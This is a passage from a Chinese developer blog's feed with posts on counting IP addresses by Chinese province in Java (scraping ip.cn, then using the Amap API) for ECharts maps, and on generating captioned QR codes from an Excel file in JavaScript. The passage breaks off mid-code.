class="line">		provinceMap.put(&quot;福建&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;贵州&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;广东&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;青海&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;西藏&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;四川&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;宁夏&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;海南&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;台湾&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;香港&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;澳门&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;其他&quot;, 0);</span><br><span class="line"></span><br><span class="line">		Map&lt;String, Integer&gt; provinceGeoIpMap = new HashMap&lt;String, Integer&gt;();</span><br><span class="line">		provinceGeoIpMap.put(&quot;Beijing&quot;, 0);</span><br><span class="line">		provinceGeoIpMap.put(&quot;Tianjin&quot;, 0);</span><br><span class="line">		provinceGeoIpMap.put(&quot;Shanghai&quot;, 0);</span><br><span class="line">		provinceGeoIpMap.put(&quot;Chongqing&quot;, 0);</span><br><span class="line">		provinceGeoIpMap.put(&quot;Hebei&quot;, 0);</span><br><span class="line">		provinceGeoIpMap.put(&quot;Hainan&quot;, 0);</span><br><span class="line">		provinceGeoIpMap.put(&quot;Yunnan&quot;, 0);</span><br><span class="line">		provinceGeoIpMap.put(&quot;Liaoning&quot;, 0);</span><br><span class="line">		provinceGeoIpMap.put(&quot;Heilongjiang&quot;, 0);</span><br><span class="line">		provinceGeoIpMap.put(&quot;Hunan&quot;, 0);</span><br><span class="line">		provinceGeoIpMap.put(&quot;Anhui&quot;, 0);</span><br><span class="line">		provinceGeoIpMap.put(&quot;Shandong&quot;, 0);</span><br><span class="line">		provinceGeoIpMap.put(&quot;Xinjiang&quot;, 0);</span><br><span class="line">		provinceGeoIpMap.put(&quot;Jiangsu&quot;, 0);</span><br><span class="line">		provinceGeoIpMap.put(&quot;Zhejiang&quot;, 0);</span><br><span class="line">		provinceGeoIpMap.put(&quot;Jiangxi&quot;, 0);</span><br><span class="line">		provinceGeoIpMap.put(&quot;Hubei&quot;, 0);</span><br><span class="line">		provinceGeoIpMap.put(&quot;Guangxi&quot;, 0);</span><br><span class="line">		provinceGeoIpMap.put(&quot;Gansu&quot;, 0);</span><br><span class="line">		provinceGeoIpMap.put(&quot;Shanxi&quot;, 0); // 山西</span><br><span class="line">		provinceGeoIpMap.put(&quot;Inner Mongolia Autonomous Region&quot;, 0);</span><br><span class="line">		provinceGeoIpMap.put(&quot;Shaanxi&quot;, 0); // 陕西</span><br><span class="line">		provinceGeoIpMap.put(&quot;Jilin&quot;, 0);</span><br><span class="line">		provinceGeoIpMap.put(&quot;Fujian&quot;, 0);</span><br><span class="line">		provinceGeoIpMap.put(&quot;Guizhou&quot;, 0);</span><br><span class="line">		provinceGeoIpMap.put(&quot;Guangdong&quot;, 0);</span><br><span class="line">		provinceGeoIpMap.put(&quot;Qinghai&quot;, 0);</span><br><span class="line">		provinceGeoIpMap.put(&quot;Tibet&quot;, 0); // 西藏</span><br><span class="line">		provinceGeoIpMap.put(&quot;Sichuan&quot;, 0);</span><br><span class="line">		provinceGeoIpMap.put(&quot;Ningxia Hui Autonomous Region&quot;, 0);</span><br><span class="line">		provinceGeoIpMap.put(&quot;Hainan&quot;, 0);</span><br><span class="line"></span><br><span class="line">		StringBuffer other = new StringBuffer();</span><br><span class="line"></span><br><span class="line">		try &#123;</span><br><span class="line"></span><br><span class="line">			for (int i = 0; i &lt; ips.length; i++) &#123;</span><br><span class="line">				// 获取ip.cn的页面内容</span><br><span class="line">				Document html = httpGet(&quot;https://ip.cn/?ip=&quot; + ips[i], null);</span><br><span class="line">				Elements pelements = html.getElementsByClass(&quot;well&quot;).get(0).getElementsByTag(&quot;p&quot;);</span><br><span class="line">				// 所在地理位置</span><br><span class="line">				String addresStr = pelements.get(1).getElementsByTag(&quot;code&quot;).text();</span><br><span class="line">				String provinceAddresStr = addresStr.substring(0, 2);</span><br><span class="line">				// GeoIP(局域网以及特殊ip没有)</span><br><span class="line">				String geoIpStr = pelements.size() == 3 ? pelements.get(2).getElementsByTag(&quot;code&quot;).text() : &quot;&quot;;</span><br><span class="line">				String[] geoIpAry = geoIpStr.split(&quot;, &quot;);</span><br><span class="line">				String provinceGeoIpStr = 1 &lt; geoIpAry.length ? geoIpAry[geoIpAry.length - 2]</span><br><span class="line">						: 0 &lt; geoIpAry.length ? geoIpAry[0] : &quot;&quot;;</span><br><span class="line"></span><br><span class="line">				System.out.println(i + &quot;\t&quot; + provinceAddresStr + &quot;\t&quot; + provinceGeoIpStr);</span><br><span class="line">				// 根据所在地理位置判断</span><br><span class="line">				if (provinceMap.get(provinceAddresStr) == null) &#123;</span><br><span class="line">					// 根据GeoIP判断</span><br><span class="line">					if (provinceGeoIpMap.get(provinceGeoIpStr) == null) &#123;</span><br><span class="line">						// 其他</span><br><span class="line">						provinceMap.put(&quot;其他&quot;, provinceMap.get(&quot;其他&quot;) + 1);</span><br><span class="line">						other.append(i + &quot;\t&quot; + ips[i] + &quot;\t&quot; + addresStr + &quot;\t&quot; + geoIpStr + &quot;\r\n&quot;);</span><br><span class="line">					&#125; else &#123;</span><br><span class="line">						provinceGeoIpMap.put(provinceGeoIpStr, provinceGeoIpMap.get(provinceGeoIpStr) + 1);</span><br><span class="line">					&#125;</span><br><span class="line">				&#125; else &#123;</span><br><span class="line">					provinceMap.put(provinceAddresStr, provinceMap.get(provinceAddresStr) + 1);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		&#125; catch (SocketException se) &#123;</span><br><span class="line">			System.out.println(&quot;连接超时，请从最后的下标继续执行，然后手动合并数据。&quot;);</span><br><span class="line">			se.printStackTrace();</span><br><span class="line">		&#125; catch (Exception e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125; finally &#123;</span><br><span class="line">			try &#123;</span><br><span class="line">				margeCount(provinceMap, provinceGeoIpMap);</span><br><span class="line">				StringBuffer result = new StringBuffer();</span><br><span class="line">				provinceMap.forEach((k, v) -&gt; &#123;</span><br><span class="line">					result.append(&quot;&#123;name: &apos;&quot;).append(k).append(&quot;&apos;,value: &quot;).append(v).append(&quot;&#125;,&quot;);</span><br><span class="line">				&#125;);</span><br><span class="line">				System.out.println(result.toString());</span><br><span class="line">				System.out.println(other);</span><br><span class="line">				// 保存其他数据</span><br><span class="line">				FileOutputStream fos = new FileOutputStream(new File(&quot;D:\\otherIP.txt&quot;));</span><br><span class="line">				fos.write(other.toString().getBytes());</span><br><span class="line">				fos.close();</span><br><span class="line">			&#125; catch (Exception e) &#123;</span><br><span class="line">				e.printStackTrace();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	/**</span><br><span class="line">	 * httGet请求</span><br><span class="line">	 */</span><br><span class="line">	private static Document httpGet(String url, String cookie) throws IOException &#123;</span><br><span class="line">		Connection con = Jsoup.connect(url);</span><br><span class="line">		// 请求头设置</span><br><span class="line">		con.header(&quot;Accept&quot;, &quot;*/*&quot;);</span><br><span class="line">		con.header(&quot;User-Agent&quot;,</span><br><span class="line">				&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36&quot;);</span><br><span class="line">		if (StringUtils.isNotEmpty(cookie)) &#123;</span><br><span class="line">			// cookie设置</span><br><span class="line">			con.header(&quot;Cookie&quot;, cookie);</span><br><span class="line">		&#125;</span><br><span class="line">		return con.get();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	/**</span><br><span class="line">	 * 数据合并</span><br><span class="line">	 */</span><br><span class="line">	private static void margeCount(Map&lt;String, Integer&gt; targetMap, Map&lt;String, Integer&gt; addMap) &#123;</span><br><span class="line">		targetMap.put(&quot;北京&quot;, targetMap.get(&quot;北京&quot;) + addMap.get(&quot;Beijing&quot;));</span><br><span class="line">		targetMap.put(&quot;天津&quot;, targetMap.get(&quot;天津&quot;) + addMap.get(&quot;Tianjin&quot;));</span><br><span class="line">		targetMap.put(&quot;上海&quot;, targetMap.get(&quot;上海&quot;) + addMap.get(&quot;Shanghai&quot;));</span><br><span class="line">		targetMap.put(&quot;重庆&quot;, targetMap.get(&quot;重庆&quot;) + addMap.get(&quot;Chongqing&quot;));</span><br><span class="line">		targetMap.put(&quot;河北&quot;, targetMap.get(&quot;河北&quot;) + addMap.get(&quot;Hebei&quot;));</span><br><span class="line">		targetMap.put(&quot;河南&quot;, targetMap.get(&quot;河南&quot;) + addMap.get(&quot;Hainan&quot;));</span><br><span class="line">		targetMap.put(&quot;云南&quot;, targetMap.get(&quot;云南&quot;) + addMap.get(&quot;Yunnan&quot;));</span><br><span class="line">		targetMap.put(&quot;辽宁&quot;, targetMap.get(&quot;辽宁&quot;) + addMap.get(&quot;Liaoning&quot;));</span><br><span class="line">		targetMap.put(&quot;黑龙江&quot;, targetMap.get(&quot;黑龙&quot;) + addMap.get(&quot;Heilongjiang&quot;));</span><br><span class="line">		targetMap.remove(&quot;黑龙&quot;);</span><br><span class="line">		targetMap.put(&quot;湖南&quot;, targetMap.get(&quot;湖南&quot;) + addMap.get(&quot;Hunan&quot;));</span><br><span class="line">		targetMap.put(&quot;安徽&quot;, targetMap.get(&quot;安徽&quot;) + addMap.get(&quot;Anhui&quot;));</span><br><span class="line">		targetMap.put(&quot;山东&quot;, targetMap.get(&quot;山东&quot;) + addMap.get(&quot;Shandong&quot;));</span><br><span class="line">		targetMap.put(&quot;新疆&quot;, targetMap.get(&quot;新疆&quot;) + addMap.get(&quot;Xinjiang&quot;));</span><br><span class="line">		targetMap.put(&quot;江苏&quot;, targetMap.get(&quot;江苏&quot;) + addMap.get(&quot;Jiangsu&quot;));</span><br><span class="line">		targetMap.put(&quot;浙江&quot;, targetMap.get(&quot;浙江&quot;) + addMap.get(&quot;Zhejiang&quot;));</span><br><span class="line">		targetMap.put(&quot;江西&quot;, targetMap.get(&quot;江西&quot;) + addMap.get(&quot;Jiangxi&quot;));</span><br><span class="line">		targetMap.put(&quot;湖北&quot;, targetMap.get(&quot;湖北&quot;) + addMap.get(&quot;Hubei&quot;));</span><br><span class="line">		targetMap.put(&quot;广西&quot;, targetMap.get(&quot;广西&quot;) + addMap.get(&quot;Guangxi&quot;));</span><br><span class="line">		targetMap.put(&quot;甘肃&quot;, targetMap.get(&quot;甘肃&quot;) + addMap.get(&quot;Gansu&quot;));</span><br><span class="line">		targetMap.put(&quot;山西&quot;, targetMap.get(&quot;山西&quot;) + addMap.get(&quot;Shanxi&quot;));</span><br><span class="line">		targetMap.put(&quot;内蒙古&quot;, targetMap.get(&quot;内蒙&quot;) + addMap.get(&quot;Inner Mongolia Autonomous Region&quot;));</span><br><span class="line">		targetMap.remove(&quot;内蒙&quot;);</span><br><span class="line">		targetMap.put(&quot;陕西&quot;, targetMap.get(&quot;陕西&quot;) + addMap.get(&quot;Shaanxi&quot;));</span><br><span class="line">		targetMap.put(&quot;吉林&quot;, targetMap.get(&quot;吉林&quot;) + addMap.get(&quot;Jilin&quot;));</span><br><span class="line">		targetMap.put(&quot;福建&quot;, targetMap.get(&quot;福建&quot;) + addMap.get(&quot;Fujian&quot;));</span><br><span class="line">		targetMap.put(&quot;贵州&quot;, targetMap.get(&quot;贵州&quot;) + addMap.get(&quot;Guizhou&quot;));</span><br><span class="line">		targetMap.put(&quot;广东&quot;, targetMap.get(&quot;广东&quot;) + addMap.get(&quot;Guangdong&quot;));</span><br><span class="line">		targetMap.put(&quot;青海&quot;, targetMap.get(&quot;青海&quot;) + addMap.get(&quot;Qinghai&quot;));</span><br><span class="line">		targetMap.put(&quot;西藏&quot;, targetMap.get(&quot;西藏&quot;) + addMap.get(&quot;Tibet&quot;));</span><br><span class="line">		targetMap.put(&quot;四川&quot;, targetMap.get(&quot;四川&quot;) + addMap.get(&quot;Sichuan&quot;));</span><br><span class="line">		targetMap.put(&quot;宁夏&quot;, targetMap.get(&quot;宁夏&quot;) + addMap.get(&quot;Ningxia Hui Autonomous Region&quot;));</span><br><span class="line">		targetMap.put(&quot;海南&quot;, targetMap.get(&quot;海南&quot;) + addMap.get(&quot;Hainan&quot;));</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>根据生成的文本替换Echart的数据，展示效果如下。<br><img src="/img/20200402/2.png" alt><br><a href="https://xuchunlei.top/ipDistributionMap" target="_blank">IP地址分布地图Echarts代码页面</a></p>
<p><img src="/img/20200402/3.png" alt><br><a href="https://xuchunlei.top/ipDistributionPie" target="_blank">IP地址分布饼状图Echarts代码页面</a></p>
]]></content>
      <tags>
        <tag>Java</tag>
        <tag>IP</tag>
        <tag>Echarts</tag>
      </tags>
  </entry>
  <entry>
    <title>JS读取EXCEL文件批量生成带描述的二维码并打包下载</title>
    <url>/2022/03/24/JS%E8%AF%BB%E5%8F%96EXCEL%E6%96%87%E4%BB%B6%E6%89%B9%E9%87%8F%E7%94%9F%E6%88%90%E5%B8%A6%E6%8F%8F%E8%BF%B0%E7%9A%84%E4%BA%8C%E7%BB%B4%E7%A0%81%E5%B9%B6%E6%89%93%E5%8C%85%E4%B8%8B%E8%BD%BD/</url>
    <content><![CDATA[<p><em>起因是朋友二月上旬想让我做个程序，本来打算二月底给他弄一下的，结果赶上出差就搁置了。直到三月初出差回来，打算周末搞的，结果朋友在周末之前催，奈何时间太紧，决定当天JS快速搞一下，只实现了简单的功能。谁知朋友问的时候，已经找别人做好了……虽然有完成的，但是期间还找过我几次。最后不用我的，但觉得一直烂尾不好（第二次修改其实已经实现了大部分要求），今天就把未实现（打包下载）的坑填上，简单记录一下</em></p>
<h3 id="用到的第三方JS库"><a href="#用到的第三方JS库" class="headerlink" title="用到的第三方JS库"></a>用到的第三方JS库</h3><ul>
<li>Excel读取<ul>
<li>SheetJS <a href="https://github.com/SheetJS/sheetjs" target="_blank" rel="noopener">https://github.com/SheetJS/sheetjs</a></li>
</ul>
</li>
<li>二维码生成<ul>
<li>jquery.qrcode.js <a href="https://github.com/jeromeetienne/jquery-qrcode" target="_blank" rel="noopener">https://github.com/jeromeetienne/jquery-qrcode</a></li>
</ul>
</li>
<li>压缩打包<ul>
<li>JSZip <a href="https://github.com/Stuk/jszip" target="_blank" rel="noopener">https://github.com/Stuk/jszip</a></li>
</ul>
</li>
<li>文件保存<ul>
<li>FileSaver.js <a href="https://github.com/eligrey/FileSaver.js" target="_blank" rel="noopener">https://github.com/eligrey/FileSaver.js</a></li>
</ul>
</li>
</ul>
<p>JQuery就不说明了，这里根据需求还需要Base64编码<br>js-base64 <a href="https://github.com/dankogai/js-base64" target="_blank" rel="noopener">https://github.com/dankogai/js-base64</a></p>
<h3 id="主要代码"><a href="#主要代码" class="headerlink" title="主要代码"></a>主要代码</h3><p>代码仅供参考，读取的文件对格式有要求，需要按照自己的需求来，这里就不列出对文本处理的部分了。</p>
<h4 id="HTML部分"><a href="#HTML部分" class="headerlink" title="HTML部分"></a>HTML部分</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;div&gt;</span><br><span class="line">		&lt;span&gt;①选择Excel文件(格式固定)：&lt;/span&gt;</span><br><span class="line">		&lt;/br&gt;</span><br><span class="line">		&lt;input type=&quot;file&quot; onchange=&quot;readWorkbookFromLocalFile(this.files[0])&quot; accept=&quot;application/vnd.openxmlformats-officedocument.spreadsheetml.sheet&quot;&gt;</span><br><span class="line">		&lt;/br&gt;</span><br><span class="line">		&lt;span&gt;②二维码内容预览(可修改)：&lt;/span&gt;</span><br><span class="line">		&lt;/br&gt;</span><br><span class="line">		&lt;textarea id=&quot;target&quot; cols=&quot;100&quot; rows=&quot;20&quot;&gt;&lt;/textarea&gt;</span><br><span class="line">		&lt;/br&gt;</span><br><span class="line">		&lt;span&gt;③生成下载二维码：&lt;/span&gt;</span><br><span class="line">		&lt;/br&gt;</span><br><span class="line">		&lt;button onclick=&quot;getQRImg()&quot;&gt;生成下载二维码&lt;/button&gt;</span><br><span class="line">	&lt;/div&gt;</span><br><span class="line">	&lt;div id=&quot;codeArea&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>

<h4 id="读取Excel文件"><a href="#读取Excel文件" class="headerlink" title="读取Excel文件"></a>读取Excel文件</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">// 读取Excel文件</span><br><span class="line">function readWorkbookFromLocalFile(file, callback) &#123;</span><br><span class="line">	var reader = new FileReader();</span><br><span class="line">	reader.onload = function(e) &#123;</span><br><span class="line">		var data = e.target.result;</span><br><span class="line">		// 读取二进制的excel</span><br><span class="line">		var workbook = XLSX.read(data, &#123;type: &apos;binary&apos;&#125;);</span><br><span class="line">		var outText = XLSX.utils.sheet_to_txt(workbook.Sheets[workbook.SheetNames[0]]).replace(/\t/g, &apos;,&apos;);</span><br><span class="line">		// 去除最后一个换行符</span><br><span class="line">		outText = outText.substring(0, outText.length -1);</span><br><span class="line">		$(&quot;#target&quot;).val(outText);</span><br><span class="line">		if(callback) callback(workbook);</span><br><span class="line">	&#125;;</span><br><span class="line">	reader.readAsBinaryString(file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="生成带描述的二维码并打包下载"><a href="#生成带描述的二维码并打包下载" class="headerlink" title="生成带描述的二维码并打包下载"></a>生成带描述的二维码并打包下载</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var zip = new JSZip();</span><br><span class="line">// 生成二维码</span><br><span class="line">function makeQR(arr) &#123;</span><br><span class="line">	if (arr) &#123;</span><br><span class="line">		arr.reduce(function(per, current, index) &#123;</span><br><span class="line">			// 二维码页面显示(先生成html结构再生成二维码)</span><br><span class="line">			var html = `&lt;div id=&apos;code$&#123;index&#125;&apos; class=&apos;codeStyle&apos;&gt;&lt;/div&gt;`;</span><br><span class="line">			$(&quot;#codeArea&quot;).append(html);</span><br><span class="line">			var qrcode = $(&apos;#code&apos; + index).qrcode(&#123;</span><br><span class="line">				width: 140,</span><br><span class="line">				height: 140,</span><br><span class="line">				text: current</span><br><span class="line">			&#125;);</span><br><span class="line"></span><br><span class="line">			// 二维码添加文字描述</span><br><span class="line">			var canvas = qrcode.find(&apos;canvas&apos;).get(0);</span><br><span class="line">			var img = new Image();</span><br><span class="line">			img.src = canvas.toDataURL(&apos;image/png&apos;);</span><br><span class="line">			img.onload = function() &#123;</span><br><span class="line">				canvas.width = 140;</span><br><span class="line">				canvas.height = 180;</span><br><span class="line">				var ctx = canvas.getContext(&apos;2d&apos;);</span><br><span class="line">				//设置画布背景</span><br><span class="line">				ctx.fillStyle = &apos;#ffffff&apos;;</span><br><span class="line">				ctx.fillRect(0, 0, canvas.width, canvas.height);</span><br><span class="line">				//设置文字样式</span><br><span class="line">				ctx.fillStyle = &apos;#000000&apos;;</span><br><span class="line">				ctx.font = &apos;bold &apos; + 14 + &apos;px Arial&apos;;</span><br><span class="line">				ctx.textAlign = &apos;center&apos;;</span><br><span class="line">				//文字描述</span><br><span class="line">				ctx.fillText(nameList[index].split(&apos; &apos;)[0], 80, 155);</span><br><span class="line">				ctx.font = &apos;13px Arial&apos;;</span><br><span class="line">				ctx.textAlign = &apos;left&apos;;</span><br><span class="line">				ctx.fillText(nameList[index].split(&apos; &apos;)[1], 0, 170);</span><br><span class="line">				//绘制二维码</span><br><span class="line">				ctx.drawImage(img, 0, 0);</span><br><span class="line"></span><br><span class="line">				// canvas转成路径 取出base64数据</span><br><span class="line">				var imgdata = canvas.toDataURL(&apos;image/png&apos;).split(&apos;,&apos;)[1];</span><br><span class="line">				// 根据村名创建文件夹</span><br><span class="line">				imgFolder = zip.folder(Base64.decode(current.split(&quot;,&quot;)[4]));</span><br><span class="line">				imgFolder.file(nameList[index] + &apos;.png&apos;, imgdata, &#123; base64: true &#125;);</span><br><span class="line">				// 全部完成后打包下载</span><br><span class="line">				if (index == nameList.length -1) &#123;</span><br><span class="line">					zip.generateAsync(&#123; type: &quot;blob&quot; &#125;).then(function(content) &#123;</span><br><span class="line">						saveAs(content, &quot;QRCode.zip&quot;);</span><br><span class="line">					&#125;);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		&#125;, 0)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后来张效果图（随便弄了张，差不多都是敏感信息，全是码）<br><img src="/img/20220324/1.jpg" alt></p>
]]></content>
      <tags>
        <tag>JavaScript</tag>
        <tag>二维码</tag>
      </tags>
  </entry>
  <entry>
    <title>IP地址分布分析(国内)·续</title>
    <url>/2020/04/17/IP%E5%9C%B0%E5%9D%80%E5%88%86%E5%B8%83%E5%88%86%E6%9E%90-%E5%9B%BD%E5%86%85-%C2%B7%E7%BB%AD/</url>
    <content><![CDATA[<h2 id="IP地址分布分析-国内-·续"><a href="#IP地址分布分析-国内-·续" class="headerlink" title="IP地址分布分析(国内)·续"></a>IP地址分布分析(国内)·续</h2><p><em>今天和同事探讨了准确性的问题，觉得地图工具的IP地址判断最为准确，于是改写了原来的程序。因为是调用API，效率大幅提升，工作可用</em></p>
<h3 id="ip所在地来源"><a href="#ip所在地来源" class="headerlink" title="ip所在地来源"></a>ip所在地来源</h3><p>因为之前写<a href="https://xuchunlei.top/2019/11/21/%E5%81%9A%E6%88%90%E6%88%91%E7%9A%84%E8%B6%B3%E8%BF%B9/">足迹</a>用的百度地图，最开始考虑用百度地图的普通ip定位，但是免费的配合太少，每天只有1K，10QPS，秒秒钟用完。不过百度地图对于之前通过Jsoup请求的，通过GeoIP来判断的也能识别，但是对港澳台的ip地址判断不是很好，缺失太严重。后来改用高德地图的ip定位，个人用户每天30W，200QPS，够用。但是通过GeoIP来判断的识别不了，偶尔请求超时。</p>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><p>基本和原来一样，只是把通过Jsoup获取页面内容改成调用API获取Json内容，（渣）代码如下。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.File;</span><br><span class="line">import java.io.FileNotFoundException;</span><br><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.FileReader;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.InputStream;</span><br><span class="line">import java.io.InputStreamReader;</span><br><span class="line">import java.io.OutputStream;</span><br><span class="line">import java.net.ConnectException;</span><br><span class="line">import java.net.HttpURLConnection;</span><br><span class="line">import java.net.URL;</span><br><span class="line">import java.util.ArrayList;</span><br><span class="line">import java.util.LinkedHashMap;</span><br><span class="line">import java.util.List;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">import com.alibaba.fastjson.JSONObject;</span><br><span class="line"></span><br><span class="line">public class IpDistributionCreaterByMap &#123;</span><br><span class="line"></span><br><span class="line">	public static void main(String args[]) &#123;</span><br><span class="line">//		String[] ips = &#123; &quot;116.116.91.150&quot;, // 正常内蒙古</span><br><span class="line">//				&quot;127.0.0.1&quot;, // 本地</span><br><span class="line">//				&quot;172.58.22.176&quot;, // 美国</span><br><span class="line">//				&quot;223.104.212.147&quot;, // geoip上海</span><br><span class="line">//				&quot;223.104.148.122&quot;, // geoip江苏</span><br><span class="line">//				&quot;47.75.7.133&quot; &#125;; // 正常香港</span><br><span class="line">//		ipDistributionCreater(ips);</span><br><span class="line"></span><br><span class="line">		// 数据量大时从文件读取</span><br><span class="line">		List&lt;String&gt; ipList = new ArrayList&lt;String&gt;();</span><br><span class="line">		try &#123;</span><br><span class="line">			BufferedReader br = new BufferedReader(new FileReader(&quot;D:\\ips.txt&quot;));</span><br><span class="line">			String lineStr = &quot;&quot;;</span><br><span class="line">			while ((lineStr = br.readLine()) != null) &#123;</span><br><span class="line">				ipList.add(lineStr);</span><br><span class="line">			&#125;</span><br><span class="line">			System.out.println(&quot;读取&quot; + ipList.size() + &quot;条IP&quot;);</span><br><span class="line">		&#125; catch (FileNotFoundException e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125; catch (IOException e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">		String[] ips = &#123;&#125;;</span><br><span class="line">		ipDistributionCreater(ipList.toArray(ips));</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	public static void ipDistributionCreater(String ips[]) &#123;</span><br><span class="line">		Map&lt;String, Integer&gt; provinceMap = new LinkedHashMap&lt;String, Integer&gt;();</span><br><span class="line">		provinceMap.put(&quot;北京&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;天津&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;上海&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;重庆&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;河北&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;河南&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;云南&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;辽宁&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;黑龙&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;黑龙江&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;湖南&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;安徽&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;山东&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;新疆&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;江苏&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;浙江&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;江西&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;湖北&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;广西&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;甘肃&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;山西&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;内蒙&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;内蒙古&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;陕西&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;吉林&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;福建&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;贵州&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;广东&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;青海&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;西藏&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;四川&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;宁夏&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;海南&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;台湾&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;香港&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;澳门&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;其他&quot;, 0);</span><br><span class="line"></span><br><span class="line">		StringBuffer other = new StringBuffer();</span><br><span class="line"></span><br><span class="line">		try &#123;</span><br><span class="line">			for (int i = 0; i &lt; ips.length; i++) &#123;</span><br><span class="line">				// JSONObject jsonObject = httpRequest(</span><br><span class="line">				// &quot;http://api.map.baidu.com/location/ip?ak=百度key&amp;ip=&quot; + ips[i], &quot;GET&quot;,</span><br><span class="line">				// null);</span><br><span class="line">				// if (&quot;0&quot;.equals(jsonObject.getString(&quot;status&quot;))) &#123;</span><br><span class="line">				// System.out.println(jsonObject.getJSONObject(&quot;content&quot;).getJSONObject(&quot;address_detail&quot;).getString(&quot;province&quot;));</span><br><span class="line">				// &#125; else &#123;</span><br><span class="line">				// System.out.println(&quot;error:&quot; + ips[i]);</span><br><span class="line">				// &#125;</span><br><span class="line">				JSONObject jsonObject = httpRequest(</span><br><span class="line">						&quot;http://restapi.amap.com/v3/ip?key=高德key&amp;ip=&quot; + ips[i], &quot;GET&quot;, null);</span><br><span class="line">				String province = &quot;&quot;;</span><br><span class="line">				if (&quot;1&quot;.equals(jsonObject.getString(&quot;status&quot;))) &#123;</span><br><span class="line">					province = jsonObject.getString(&quot;province&quot;).substring(0, 2);</span><br><span class="line">					if (&quot;[]&quot;.equals(province)) &#123;</span><br><span class="line">						provinceMap.put(&quot;其他&quot;, provinceMap.get(&quot;其他&quot;) + 1);</span><br><span class="line">						other.append(i + &quot;\t&quot; + ips[i] + &quot;\r\n&quot;);</span><br><span class="line">					&#125; else &#123;</span><br><span class="line">						provinceMap.put(province, provinceMap.get(province) + 1);</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				System.out.println(i + &quot;\t&quot; + province);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		&#125; catch (Exception e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125; finally &#123;</span><br><span class="line">			provinceMap.put(&quot;黑龙江&quot;, provinceMap.get(&quot;黑龙&quot;));</span><br><span class="line">			provinceMap.remove(&quot;黑龙&quot;);</span><br><span class="line">			provinceMap.put(&quot;内蒙古&quot;, provinceMap.get(&quot;内蒙&quot;));</span><br><span class="line">			provinceMap.remove(&quot;内蒙&quot;);</span><br><span class="line">			StringBuffer result = new StringBuffer();</span><br><span class="line">			provinceMap.forEach((k, v) -&gt; &#123;</span><br><span 